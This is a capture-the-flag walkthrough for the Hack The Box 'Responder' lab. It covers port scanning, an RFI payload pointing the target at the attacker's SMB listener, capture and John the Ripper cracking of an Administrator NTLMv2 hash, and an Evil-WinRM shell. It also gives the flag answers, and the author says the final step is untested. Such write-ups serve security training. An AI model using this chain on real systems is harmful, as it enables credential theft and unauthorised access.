# Responder

## Initial Scan

```bash
sudo nmap -p- --min-rate 5000 -sV -v 10.129.169.214
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-08 06:28 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 06:28
Scanning 10.129.169.214 [4 ports]
Completed Ping Scan at 06:28, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 06:28
Scanning unika.htb (10.129.169.214) [65535 ports]
Discovered open port 80/tcp on 10.129.169.214
Discovered open port 7680/tcp on 10.129.169.214
Discovered open port 5985/tcp on 10.129.169.214
Completed SYN Stealth Scan at 06:28, 27.06s elapsed (65535 total ports)
Initiating Service scan at 06:28
Scanning 3 services on unika.htb (10.129.169.214)
Completed Service scan at 06:29, 45.92s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.169.214.
Initiating NSE at 06:29
Completed NSE at 06:29, 0.73s elapsed
Initiating NSE at 06:29
Completed NSE at 06:29, 0.47s elapsed
Nmap scan report for unika.htb (10.129.169.214)
Host is up (0.14s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.69 seconds
           Raw packets sent: 131089 (5.768MB) | Rcvd: 18 (776B)
```

## Task 1

**When visiting the web service using the IP address, what is the domain that we are being redirected to?**

Found by going to the IP and looking at the URL.

Answer: unika.htb

## Task 2

**Which scripting language is being used on the server to generate webpages?**

Had to add the IP to the website name in my hosts file.

```bash
echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hostsh
```

Found by: browsing the site and changing the language on the site to French or German

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

We see the URL is `http://unika.htb/index.php?page=german.html`, showing this is written in PHP.

Answer: PHP

## Task 3

**What is the name of the URL parameter which is used to load different language versions of the webpage?**

Again, looking at the URL, we can see the query as `page=`

Answer: Page

## Task 4

**Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**

Found by the answer being as long as that value, but as well as googling 'exploiting PHP LFI' will give us various articles with this explaining how, and other examples.

Answer: `../../../../../../../../windows/system32/drivers/etc/hosts`

## Task 5

**Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**

Again, found by the answer being as long as the value, but also googling 'Exploiting php RFI' gives more articles and explaining how, and other exampls.

Answer: `//10.10.14.6/somefile`

## Task 6

**What does NTLM stand for?**

Found by Google

Answer: New Technology LAN Manager

## Task 7

**Which flag do we use in the Responder utility to specify the network interface?**

After simply running `./responder.py`, we are given:

```
sudo ./Responder.py
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Error: -I <if> mandatory option is missing
```

Answer: -I

## Task 8

**There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?**

Found by general knowledge on popular password cracking tools.

Answer: John The Ripper

## Task 9

**What is the password for the administrator user?**

First we run responder to capture the hash.

```
sudo ./Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

...

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.38]
    Responder IPv6             [dead:beef:2::1024]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-3UXOOA4MNN1]
    Responder Domain Name      [I5PS.LOCAL]
    Responder DCE-RPC Port     [45988]

[+] Listening for events...
```

After going to the URL: `http://unika.htb/?page=//10.10.14.38/randomfile` we can look back at responder and see the hash.

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.169.214
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:dd18bd7a646ce3eb:410E35FFEAE5E2CAA7D2B199EB83C620:010100000000000080A356F349C3D8013DC03F3B991E3F8E0000000002000800590035004200440001001E00570049004E002D00510059004E005900370059005A00310030004A00580004003400570049004E002D00510059004E005900370059005A00310030004A0058002E0059003500420044002E004C004F00430041004C000300140059003500420044002E004C004F00430041004C000500140059003500420044002E004C004F00430041004C000700080080A356F349C3D8010600040002000000080030003000000000000000010000000020000026B1B1EBE508823F7235F874E0EEE32F13650E88797AF1DD65C68ED3CD47D54F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330038000000000000000000
```

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Putting the hash in a file were going to crack it with John the ripper

```
Administrator::RESPONDER:dd18bd7a646ce3eb:410E35FFEAE5E2CAA7D2B199EB83C620:010100000000000080A356F349C3D8013DC03F3B991E3F8E0000000002000800590035004200440001001E00570049004E002D00510059004E005900370059005A00310030004A00580004003400570049004E002D00510059004E005900370059005A00310030004A0058002E0059003500420044002E004C004F00430041004C000300140059003500420044002E004C004F00430041004C000500140059003500420044002E004C004F00430041004C000700080080A356F349C3D8010600040002000000080030003000000000000000010000000020000026B1B1EBE508823F7235F874E0EEE32F13650E88797AF1DD65C68ED3CD47D54F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330038000000000000000000
```

```bash
sudo ./john -w=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt ~/hash.txt
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-09-08 06:18) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Answer: badminton

## Task 10

**We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?**

Found within the initial scan

Answer: 5985

## Task 11

**Submit root flag**

This part I did have to look around online as I was unable to get evil-winrm to work for me an looking into that it is apparently a known issue, apparently with openssl, but also could be having to restart the victim box and/or the VPN connection. But it SHOULD be:

Using Evil-WinRM, we will get a shell into the machine and find the file under the users desktop.

```
sudo ruby evil-winrm.rb -i 10.129.95.234 -u administrator -p 'badminton'
```

Once we get our shell on the machine, we can find the flag under C:\Users\mike\Desktop\flag.txt.

Answer: ea81b7afddd03efaa0945333ed147fac
